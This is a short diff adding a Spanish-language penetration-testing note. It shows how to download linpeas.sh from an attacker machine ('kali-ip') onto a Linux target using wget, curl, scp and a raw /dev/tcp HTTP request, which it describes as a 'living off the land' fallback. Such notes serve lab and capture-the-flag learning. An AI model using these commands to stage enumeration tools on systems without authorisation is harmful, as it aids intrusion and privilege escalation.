@@ -1,0 +1,49 @@
+Este documento describe varias formas de descargar archivos en sistemas Linux.
+Cada método está adaptado a diferentes casos y entornos de red.
+
+1. Usando wget
+
+Si tienes wget, el comando para descargar un archivo desde un servidor sería:
+
+wget http://kali-ip/linpeas.sh -O linpeas.sh
+
+    http://kali-ip/linpeas.sh es la URL del archivo en el servidor.
+    -O linpeas.sh guarda el archivo descargado como linpeas.sh en el directorio actual.
+
+2. Usando curl
+
+Si curl está disponible, puedes usar este comando:
+
+curl -o linpeas.sh http://kali-ip/linpeas.sh
+
+    -o linpeas.sh especifica el nombre del archivo destino.
+    http://kali-ip/linpeas.sh es la URL del archivo en el servidor.
+
+3. Usando scp
+
+En caso de que wget y curl estén ausentes, pero tienes acceso SSH y scp está disponible, puedes transferir el archivo directamente desde tu máquina local (si el archivo está en tu máquina de origen):
+
+scp user@kali-ip:/path/to/linpeas.sh ./linpeas.sh
+
+    user@kali-ip:/path/to/linpeas.sh debe apuntar a la ubicación y el usuario que tiene el archivo en el servidor.
+    ./linpeas.sh guarda el archivo en el directorio actual bajo el mismo nombre.
+
+4. Descargar usando /dev/tcp
+
+Descripción: Si wget, curl, y scp no están disponibles, Linux permite hacer una conexión TCP cruda usando /dev/tcp. Este método puede descargarse un archivo desde un servidor HTTP en situaciones limitadas o de “living off the land”.
+
+Comandos:
+
+exec 3<>/dev/tcp/kali-ip/80
+echo -e "GET /linpeas.sh HTTP/1.1\r\nHost: kali-ip\r\nConnection: close\r\n\r\n" >&3
+cat <&3 > linpeas.sh
+
+Paso a Paso:
+
+    exec 3<>/dev/tcp/kali-ip/80: Abre una conexión bidireccional al puerto 80 del host kali-ip.
+    echo -e "GET /linpeas.sh HTTP/1.1\r\nHost: kali-ip\r\nConnection: close\r\n\r\n" >&3: Envía una solicitud HTTP simple.
+    cat <&3 > linpeas.sh: Recibe el archivo y lo guarda como linpeas.sh.
+
+Caso de Uso:
+
+    Este método es una opción de último recurso en sistemas donde no hay acceso a wget, curl, o scp. Es ideal para ambientes limitados donde puedes hacer una solicitud HTTP en crudo.
